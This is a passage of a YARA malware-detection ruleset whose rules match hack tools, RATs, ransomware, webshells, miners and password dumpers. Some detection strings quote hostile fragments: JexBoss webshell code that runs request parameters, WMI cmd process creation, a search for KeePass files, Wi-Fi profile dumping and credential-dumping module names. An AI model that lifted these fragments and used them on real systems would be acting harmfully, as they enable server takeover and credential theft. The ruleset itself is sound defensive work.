\"Response.Write(ENC(SET_ASS_SUCCESS));\" fullword ascii\n      $s3 = \"hashtable[hash] = assCode;\" fullword ascii\n      $s4 = \"Response.Write(ss);\" fullword ascii\n      $s5 = \"var hashtable = Application[CachePtr];\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 2KB and 4 of them\n}\n\nrule HKTL_PowerKatz_Feb19_1_RID2EB0 : DEMO HKTL {\n   meta:\n      description = \"Detetcs a tool used in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 11:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Powerkatz32\" ascii wide fullword\n      $x2 = \"Powerkatz64\" ascii wide\n      $s1 = \"GetData: not found taskName\" fullword ascii wide\n      $s2 = \"GetRes Ex:\" fullword ascii wide\n   condition: \n      1 of ( $x* ) and 1 of ( $s* )\n}\n\nrule HKTL_Unknown_Feb19_1_RID2DF9 : DEMO HKTL {\n   meta:\n      description = \"Detetcs a tool used in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"not a valid timeout format!\" ascii wide fullword\n      $x2 = \"host can not be empty!\" ascii wide fullword\n      $x3 = \"not a valid port format!\" ascii wide fullword\n      $x4 = \"{0} - {1} TTL={2} time={3}\" ascii wide fullword\n      $x5 = \"ping count is not a correct format!\" ascii wide fullword\n      $s1 = \"The result is too large,program store to '{0}'.Please download it manully.\" fullword ascii wide\n      $s2 = \"C:\\\\Windows\\\\temp\\\\\" ascii wide\n   condition: \n      1 of ( $x* ) or 2 of them\n}\n\nrule SUSP_EnableContent_String_Gen_RID322C : DEMO FILE GEN OFFICE SUSP T1203 T1566_001 {\n   meta:\n      description = \"Detects suspicious string that asks to enable active content in Office Doc\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-02-12 13:53:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"525ba2c8d35f6972ac8fcec8081ae35f6fe8119500be20a4113900fe57d6a0de\"\n      tags = \"DEMO, FILE, GEN, OFFICE, SUSP, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $e1 = \"Enable Editing\" fullword ascii\n      $e2 = \"Enable Content\" fullword ascii\n      $e3 = \"Enable editing\" fullword ascii\n      $e4 = \"Enable content\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and ( $e1 in ( 0 .. 3000 ) or $e2 in ( 0 .. 3000 ) or $e3 in ( 0 .. 3000 ) or $e4 in ( 0 .. 3000 ) or 2 of them )\n}\n\nrule SUSP_WordDoc_VBA_Macro_Strings_RID323F : DEMO FILE OFFICE SCRIPT SUSP T1203 T1566_001 {\n   meta:\n      description = \"Detects suspicious strings in Word Doc that indcate malicious use of VBA macros\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-02-12 13:57:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"525ba2c8d35f6972ac8fcec8081ae35f6fe8119500be20a4113900fe57d6a0de\"\n      tags = \"DEMO, FILE, OFFICE, SCRIPT, SUSP, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\Microsoft Shared\\\\\" ascii\n      $a2 = \"\\\\VBA\\\\\" ascii\n      $a3 = \"Microsoft Office Word\" fullword ascii\n      $a4 = \"PROJECTwm\" fullword wide\n      $s1 = \"AppData\" fullword ascii\n      $s2 = \"Document_Open\" fullword ascii\n      $s3 = \"Project1\" fullword ascii\n      $s4 = \"CreateObject\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 800KB and all of them\n}\n\nrule SUSP_Katz_PDB_RID2B8A : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious PDB in file\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-02-04 09:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6888ce8116c721e7b2fc3d7d594666784cf38a942808f35e309a48e536d8e305\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $s1 = /\\\\Release\\\\[a-z]{0,8}katz.pdb/ \n      $s2 = /\\\\Debug\\\\[a-z]{0,8}katz.pdb/ \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them\n}\n\nrule MAL_ExileRAT_Feb19_1_RID2D8E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Exile RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html\"\n      date = \"2019-02-04 10:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3eb026d8b778716231a07b3dbbdc99e2d3a635b1956de8a1e6efc659330e52de\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"Content-Disposition:form-data;name=\\\"x.bin\\\"\" fullword ascii\n      $s1 = \"syshost.dll\" fullword ascii\n      $s2 = \"\\\\scout\\\\Release\\\\scout.pdb\" ascii\n      $s3 = \"C:\\\\data.ini\" fullword ascii\n      $s4 = \"my-ip\\\" value=\\\"\" fullword ascii\n      $s5 = \"ver:%d.%d.%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"da8475fc7c3c90c0604ce6a0b56b5f21\" or 3 of them )\n}\n\nrule PUA_CryptoMiner_Jan19_1_RID2F44 : DEMO MAL {\n   meta:\n      description = \"Detects Crypto Miner strings\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-31 11:49:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ede858683267c61e710e367993f5e589fcb4b4b57b09d023a67ea63084c54a05\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Stratum notify: invalid Merkle branch\" fullword ascii\n      $s2 = \"-t, --threads=N       number of miner threads (default: number of processors)\" fullword ascii\n      $s3 = \"User-Agent: cpuminer/\" ascii\n      $s4 = \"hash > target (false positive)\" fullword ascii\n      $s5 = \"thread %d: %lu hashes, %s khash/s\" fullword ascii\n   condition: \n      filesize < 1000KB and 1 of them\n}\n\nrule APT_MAL_DNS_Hijacking_Campaign_AA19_024A_RID345A : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used in DNS Hijackign campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/AA19-024A\"\n      date = \"2019-01-25 15:26:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2010f38ef300be4349e7bc287e720b1ecec678cacbf0ea0556bcf765f6e073ec\"\n      hash2 = \"45a9edb24d4174592c69d9d37a534a518fbe2a88d3817fc0cc739e455883b8ff\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"/Client/Login?id=\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\" fullword ascii\n      $s4 = \".\\\\Configure.txt\" fullword ascii\n      $s5 = \"Content-Disposition: form-data; name=\\\"files\\\"; filename=\\\"\" fullword ascii\n      $s6 = \"Content-Disposition: form-data; name=\\\"txts\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule SUSP_RTF_Header_Anomaly_RID2F7F : ANOMALY DEMO FILE SUSP {\n   meta:\n      description = \"Detects malformed RTF header often used to trick mechanisms that check for a full RTF header\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/975705759618158593\"\n      date = \"2019-01-20 11:59:41\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-09-15\"\n      tags = \"ANOMALY, DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint32 ( 0 ) == 0x74725c7b and not uint8 ( 4 ) == 0x66\n}\n\nrule Webshell_Tiny_ASP_Jan19_1_RID2FFF : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a Tiny ASP webshell\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-16 12:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ddcae07ec497ea43ed38fcd6379b2a35776bc2e45b8c5b0267310e92ba3b30cc\"\n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Execute Request\" ascii wide nocase\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 150 and 1 of them\n}\n\nrule MAL_CrypRAT_Jan19_1_RID2D41 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CrypRAT\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-07 10:24:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"Cryp_RAT\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"2524e5e9fe04d7bfe5efb3a5e400fe4b\" or 1 of them )\n}\n\nrule SUSP_Putty_Unnormal_Size_RID3086 : ANOMALY DEMO EXE FILE SUSP T1021_004 T1572 {\n   meta:\n      description = \"Detects a putty version with a size different than the one provided by Simon Tatham (could be caused by an additional signature or malware)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-07 12:43:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-06-30\"\n      hash1 = \"e5e89bdff733d6db1cffe8b3527e823c32a78076f8eadc2f9fd486b74a0e9d88\"\n      hash2 = \"ce4c1b718b54973291aefdd63d1cca4e4d8d4f5353a2be7f139a290206d0c170\"\n      hash3 = \"adb72ea4eab7b2efc2da6e72256b5a3bb388e9cdd4da4d3ff42a9fec080aa96f\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP, T1021_004, T1572\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SSH, Telnet and Rlogin client\" fullword wide\n      $v1 = \"Release 0.6\" wide\n      $v2 = \"Release 0.70\" wide\n      $fp1 = \"KiTTY fork\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1 and 1 of ( $v* ) and not 1 of ( $fp* ) and filesize != 524288 and filesize != 495616 and filesize != 483328 and filesize != 524288 and filesize != 712176 and filesize != 828400 and filesize != 569328 and filesize != 454656 and filesize != 531368 and filesize != 524288 and filesize != 483328 and filesize != 713592 and filesize != 829304 and filesize != 571256 and filesize != 774200 and filesize != 854072 and filesize != 665144 and filesize != 774200 and filesize != 854072 and filesize != 665144 and filesize != 640000 and filesize != 650720 and filesize != 662808 and filesize != 651256 and filesize != 664432\n}\n\nrule SUSP_JAVA_Class_with_VBS_Content_RID32D1 : DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects a JAVA class file with strings known from VBS files\"\n      author = \"Florian Roth\"\n      reference = \"https://www.menlosecurity.com/blog/a-jar-full-of-problems-for-financial-services-companies\"\n      date = \"2019-01-03 14:21:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-20\"\n      hash1 = \"e0112efb63f2b2ac3706109a233963c19750b4df0058cc5b9d3fa1f1280071eb\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"java/lang/String\" ascii\n      $s1 = \".vbs\" ascii\n      $s2 = \"createNewFile\" fullword ascii\n      $s3 = \"wscript\" fullword ascii nocase\n      $fp1 = \"com/smm/\" \n      $fp2 = \"install\" \n   condition: \n      ( uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and filesize < 100KB and $a1 and all of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule MAL_Ryuk_Ransomware_RID2E73 : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects strings known from Ryuk Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/\"\n      date = \"2018-12-31 11:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"965884f19026913b2c57b8cd4a86455a61383de01dabb69c557f45bb848f6c26\"\n      hash2 = \"b8fcd4a3902064907fb19e0da3ca7aed72a7e6d1f94d971d1ee7a4d3af6a800d\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"/v \\\"svchos\\\" /f\" fullword wide\n      $x2 = \"\\\\Documents and Settings\\\\Default User\\\\finish\" wide\n      $x3 = \"\\\\users\\\\Public\\\\finish\" wide\n      $x4 = \"lsaas.exe\" fullword wide\n      $x5 = \"RyukReadMe.txt\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"4a069c1abe5aca148d5a8fdabc26751e\" or pe.imphash ( ) == \"dc5733c013378fa418d13773f5bfe6f1\" or 1 of them )\n}\n\nrule APT_APT10_Malware_Imphash_Dec18_1_RID3250 : APT CHINA DEMO EXE FILE G0045 {\n   meta:\n      description = \"Detects APT10 malware based on ImpHashes\"\n      author = \"Florian Roth\"\n      reference = \"AlienVault OTX IOCs - statistical sample analysis\"\n      date = \"2018-12-28 13:59:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0045\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and ( pe.imphash ( ) == \"0556ff5e5f8744bff47d4921494ba46d\" or pe.imphash ( ) == \"cb1194123f68a68eb14552c085b620ce\" or pe.imphash ( ) == \"efad9ff8c0d2a6419bf1dd970bcd806d\" or pe.imphash ( ) == \"7a861cd9c495e1d950a43cb708a22985\" or pe.imphash ( ) == \"a5d0545030be75a421529c2b0be6c4bd\" or pe.imphash ( ) == \"94491f4a812b0297419dc888aa4fd2a5\" )\n}\n\nrule HKTL_NoPowerShell_RID2D65 : DEMO HKTL {\n   meta:\n      description = \"Detects NoPowerShell hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bitsadmin/nopowershell\"\n      date = \"2018-12-28 10:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\NoPowerShell.pdb\" ascii\n      $x2 = \"Invoke-WmiMethod -Class Win32_Process -Name Create \\\"cmd\" fullword wide\n      $x3 = \"ls C:\\\\Windows\\\\System32 -Include *.exe | select -First 10 Name,Length\" fullword wide\n      $x4 = \"ls -Recurse -Force C:\\\\Users\\\\ -Include *.kdbx\" fullword wide\n      $x5 = \"NoPowerShell.exe\" fullword wide\n   condition: \n      1 of them\n}\n\nrule SUSP_XMRIG_String_RID2D18 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious XMRIG crypto miner executable string in filr\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-12-28 10:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eb18ae69f1511eeb4ed9d4d7bcdf3391a06768f384e94427f4fc3bd21b383127\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"xmrig.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule SUSP_Obfuscted_PowerShell_Code_RID3298 : DEMO OBFUS SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Detects obfuscated PowerShell Code\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/silv0123/status/1073072691584880640\"\n      date = \"2018-12-13 14:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, OBFUS, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"').Invoke(\" ascii\n      $s2 = \"(\\\"{1}{0}\\\"\" ascii\n      $s3 = \"{0}\\\" -f\" ascii\n   condition: \n      #s1 > 11 and #s2 > 10 and #s3 > 10\n}\n\nrule HKTL_Lazagne_PasswordDumper_Dec18_1_RID33E8 : DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Detects password dumper Lazagne often used by middle eastern threat groups\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group\"\n      date = \"2018-12-11 15:07:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1205f5845035e3ee30f5a1ced5500d8345246ef4900bcb4ba67ef72c0f79966c\"\n      hash2 = \"884e991d2066163e02472ea82d89b64e252537b28c58ad57d9d648b969de6a63\"\n      hash3 = \"bf8f30031769aa880cdbe22bc0be32691d9f7913af75a5b68f8426d4f0c7be50\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"softwares.opera(\" ascii\n      $s2 = \"softwares.mozilla(\" ascii\n      $s3 = \"config.dico(\" ascii\n      $s4 = \"softwares.chrome(\" ascii\n      $s5 = \"softwares.outlook(\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 1 of them\n}\n\nrule HKTL_Lazagne_Gen_18_RID2DA6 : DEMO GEN HKTL T1003 {\n   meta:\n      description = \"Detects Lazagne password extractor hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/AlessandroZ/LaZagne\"\n      date = \"2018-12-11 10:40:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf\"\n      tags = \"DEMO, GEN, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"lazagne.config.powershell_execute(\" ascii\n      $x2 = \"creddump7.win32.\" ascii\n      $x3 = \"lazagne.softwares.windows.hashdump\" ascii\n      $x4 = \".softwares.memory.libkeepass.common(\" ascii\n   condition: \n      2 of them\n}\n\nrule SUSP_Modified_SystemExeFileName_in_File_RID35F8 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detecst a variant of a system file name often used by attackers to cloak their activity\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group\"\n      date = \"2018-12-11 16:35:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5723f425e0c55c22c6b8bb74afb6b506943012c33b9ec1c928a71307a8c5889a\"\n      hash2 = \"f1f11830b60e6530b680291509ddd9b5a1e5f425550444ec964a08f5f0c1a44e\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"svchosts.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them\n}\n\nrule MAL_HawkEye_Keylogger_Gen_Dec18_RID324D : DEMO GEN MAL T1056_001 T1113 {\n   meta:\n      description = \"Detects HawkEye Keylogger Reborn\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/James_inthe_box/status/1072116224652324870\"\n      date = \"2018-12-10 13:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b8693e015660d7bd791356b352789b43bf932793457d54beae351cf7a3de4dad\"\n      tags = \"DEMO, GEN, MAL, T1056_001, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HawkEye Keylogger\" fullword wide\n      $s2 = \"_ScreenshotLogger\" ascii\n      $s3 = \"_PasswordStealer\" ascii\n   condition: \n      2 of them\n}\n\nrule SUSP_PiratedOffice_2007_RID2EF8 : DEMO FILE OFFICE SUSP T1203 T1566_001 {\n   meta:\n      description = \"Detects an Office document that was created with a pirated version of MS Office 2007\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/pwnallthethings/status/743230570440826886?lang=en\"\n      date = \"2018-12-04 11:37:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"210448e58a50da22c0031f016ed1554856ed8abe79ea07193dc8f5599343f633\"\n      tags = \"DEMO, FILE, OFFICE, SUSP, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<Company>Grizli777</Company>\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 300KB and all of them\n}\n\nrule MAL_DNSPIONAGE_Malware_Nov18_RID3055 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects DNSpionage Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html\"\n      date = \"2018-11-30 12:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"2010f38ef300be4349e7bc287e720b1ecec678cacbf0ea0556bcf765f6e073ec\"\n      hash2 = \"45a9edb24d4174592c69d9d37a534a518fbe2a88d3817fc0cc739e455883b8ff\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".0ffice36o.com\" ascii\n      $s1 = \"/Client/Login?id=\" ascii\n      $s2 = \".\\\\Configure.txt\" ascii\n      $s5 = \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\" fullword ascii\n      $s6 = \"Content-Disposition: form-data; name=\\\"txts\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule WebShell_JexBoss_JSP_1_RID2F20 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects JexBoss JSPs\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-11-08 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"41e0fb374e5d30b2e2a362a2718a5bf16e73127e22f0dfc89fdb17acbe89efdf\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"equals(\\\"jexboss\\\")\" \n      $x2 = \"%><pre><%if(request.getParameter(\\\"ppp\\\") != null &&\" ascii\n      $s1 = \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><pre><% if (request.getParameter(\\\"\" \n      $s2 = \"!= null && request.getHeader(\\\"user-agent\\\"\" ascii\n      $s3 = \"String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of ( $x* ) or 2 of them\n}\n\nrule WebShell_JexBoss_WAR_1_RID2F1D : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects JexBoss versions in WAR form\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-11-08 11:43:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092\"\n      hash2 = \"6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf\"\n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"jbossass\" fullword ascii\n      $ = \"jexws.jsp\" fullword ascii\n      $ = \"jexws.jspPK\" fullword ascii\n      $ = \"jexws1.jsp\" fullword ascii\n      $ = \"jexws1.jspPK\" fullword ascii\n      $ = \"jexws2.jsp\" fullword ascii\n      $ = \"jexws2.jspPK\" fullword ascii\n      $ = \"jexws3.jsp\" fullword ascii\n      $ = \"jexws3.jspPK\" fullword ascii\n      $ = \"jexws4.jsp\" fullword ascii\n      $ = \"jexws4.jspPK\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 4KB and 1 of them\n}\n\nrule MAL_BackNet_Nov18_1_RID2D6D : DEMO EXE FILE MAL T1047 {\n   meta:\n      description = \"Detects BackNet samples\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/valsov/BackNet\"\n      date = \"2018-11-02 10:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4ce82644eaa1a00cdb6e2f363743553f2e4bd1eddb8bc84e45eda7c0699d9adc\"\n      tags = \"DEMO, EXE, FILE, MAL, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ProcessedByFody\" fullword ascii\n      $s2 = \"SELECT * FROM AntivirusProduct\" fullword wide\n      $s3 = \"/C netsh wlan show profile\" wide\n      $s4 = \"browsertornado\" fullword wide\n      $s5 = \"Current user is administrator\" fullword wide\n      $s6 = \"/C choice /C Y /N /D Y /T 4 & Del\" wide\n      $s7 = \"ThisIsMyMutex-2JUY34DE8E23D7\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them\n}\n\nrule MAL_ELF_LNX_Mirai_Oct10_2_RID2F3A : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects ELF malware Mirai related\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-10-27 11:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fa0018e75f503f9748a5de0d14d4358db234f65e28c31c8d5878cc58807081c9\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c01 = { 50 4F 53 54 20 2F 63 64 6E 2D 63 67 69 2F 00 00\n               20 48 54 54 50 2F 31 2E 31 0D 0A 55 73 65 72 2D\n               41 67 65 6E 74 3A 20 00 0D 0A 48 6F 73 74 3A } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them\n}\n\nrule SUSP_Win32dll_String_RID2E60 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious string in executables\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739\"\n      date = \"2018-10-24 11:11:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7bd7cec82ee98feed5872325c2f8fd9f0ea3a2f6cd0cd32bcbe27dbbfd0d7da1\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"win32dll.dll\" fullword ascii\n   condition: \n      filesize < 60KB and all of them\n}\n\nrule 